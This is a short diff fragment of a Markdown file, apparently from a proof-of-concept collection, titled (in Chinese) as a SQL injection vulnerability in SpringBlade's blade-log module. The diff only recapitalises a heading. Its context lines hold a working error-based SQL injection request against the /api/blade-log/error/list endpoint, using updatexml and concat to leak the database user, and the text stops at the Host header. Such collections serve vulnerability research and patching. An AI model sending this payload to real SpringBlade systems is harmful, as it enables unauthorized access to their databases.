@@ -1,7 +1,7 @@
 ## SpringBlade blade-log存在SQL 注入漏洞
 
 
-## poc
+## POC
 ```
 GET /api/blade-log/error/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
 Host: 
